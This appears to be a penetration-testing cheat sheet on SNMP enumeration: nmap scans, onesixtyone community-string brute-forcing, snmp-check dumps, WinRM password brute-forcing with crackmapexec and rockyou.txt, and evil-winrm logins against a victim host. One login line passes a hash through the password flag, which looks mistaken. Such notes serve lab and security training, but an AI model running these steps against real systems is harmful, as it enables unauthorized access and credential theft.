**SNMP (Simple Network Management Protocol)** lets devices (like servers, routers, etc.) share info about themselves — like running processes, users, or system details. It's mainly used by admins to monitor systems.

`- `This will give you the username password or any hint for login`

# <span style="color:#FF5555">Commands</span>

### <span style="color:#50FA7B">Enummeration (nmap)</span>

```bash
# Scan UDP 161 with SNMP scripts
nmap -sU -p161 --script "snmp-*" $VICTIM_IP

# Scan SNMP ports 161,162 with version and process/netstat scripts
nmap -n -vv -sV -sU -Pn -p161,162 --script=snmp-processes,snmp-netstat $VICTIM_IP
```

### <span style="color:#50FA7B">Enummeration</span>
1. `onesixtyone` is a **tool that scans for SNMP access**.
It tries a list of **common SNMP "passwords" (called community strings)** to see if the device will respond.
```bash
onesixtyone $VICTIM_IP -c $WORDLIST_PATH/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
```
2. if `onesixtyone` identified any device/string  then We can then run this with snmp-check to dump all available SNMP information.
```bash
snmp-check -c openview $VICTIM_IP
```
3. Looking through the results if we find a non default username we can bruteforce it 

```
crackmapexec winrm $VICTIM_IP -u Jareth -p $WORDLIST_PATH/rockyou.txt | grep '(Pwn3d!)'
```

4. if you found creds then connect
```bash
evil-winrm -u administrator -p aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a -i $VICTIM_IP
```

### <span style="color:#50FA7B">Connect</span>
```bash
# Use found creds to login to Windows via WinRM
evil-winrm -i $VICTIM_IP -u 'username' -p 'password'
```
